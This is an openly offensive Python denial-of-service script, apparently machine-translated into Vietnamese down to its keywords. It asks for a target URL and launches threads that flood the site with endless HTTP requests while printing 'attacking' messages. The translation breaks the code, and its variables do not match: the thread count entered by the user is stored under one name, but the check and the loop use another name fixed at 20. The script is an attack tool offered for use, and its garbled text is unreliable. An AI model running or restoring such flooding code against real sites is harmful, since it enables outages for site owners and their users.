nhập khẩu màu sắc

nhập luồng

yêu cầu nhập khẩu

 

def dos (mục tiêu):

    trong khi Đúng:

        thử:

            res = request.get (target)

            print ("</> Đang tấn công </>")

        ngoại trừ các yêu cầu.exceptions.ConnectionError:

            print ("[error]" + "Lỗi Kế Nối")

 

chủ đề = 20

in("""

           ▄▄                                                                                                     

▀████▀ ██ ███▀▀██▀▀███ ▀███▀▀▀██▄ ██           

  ██ █▀ ██ ▀█ ██ ██ ██           

  ██ ▀███ ▄██▀██▄▀█████████▄ ██ ▄▄█▀██ ▄█▀██▄ ▀█████████▄███ ██▄ ██ ██ ▄▄█▀█████████ ▄█▀██▄  

  ██ ██ ██▀ ▀██ ██ ██ ██ ▄█▀ ███ ██ ██ ██ ██ ██▀▀▀█▄▄▄█▀ ██ ██ ██ ██  

  ██ ▄ ██ ██ ██ ██ ██ ██ ██▀▀▀▀▀▀▄█████ ██ ██ ██ ██ ▀███▀▀▀▀▀▀ ██ ▄ █████  

  ██ ▄█ ██ ██▄ ▄██ ██ ██ ██ ██▄ ▄█ ██ ██ ██ ██ ██ ▄███▄ ▄ ██ ██ ██  

███████████████▄ ▀██████▀▄████ ████▄ ▄████▄ ▀█████▀████▀ ██▄████ ████ ████▄ ▄████████ ▀█████▀ ▀████████▀██▄

                                                                                                                  

                                                                                                                  

                                                                                                                  Phiên bản 1

"" ")

print ('Vi phạm bản quyền: nguyendat Admin')

print ('Zalo: https://zalo.me/nguyendat')

url = input ("Thêm URL Trang web (https //: nguyendat.net) >>")

 

thử:

    thread = int (input ("Number Luồng (10.000)>"))

ngoại trừ ValueError:

    exit ("Number Luồng Không chính xác")

 

nếu chủ đề == 0:

    exit ("Number Luồng Không chính xác")

 

nếu không phải url .__ chứa __ ("http"):

    thoát ("URL KHÔNG THÊM http hoặc https")

 

nếu không phải url .__ chứa __ ("."):

    exit ("Tên miền Không Hợp Lệ")

 

cho tôi trong phạm vi (0, chủ đề):

    thr = threading.Thread (target = dos, args = (url,))

    thr.start ()

    print (str (i + 1) + "chủ đề đã bắt đầu!")

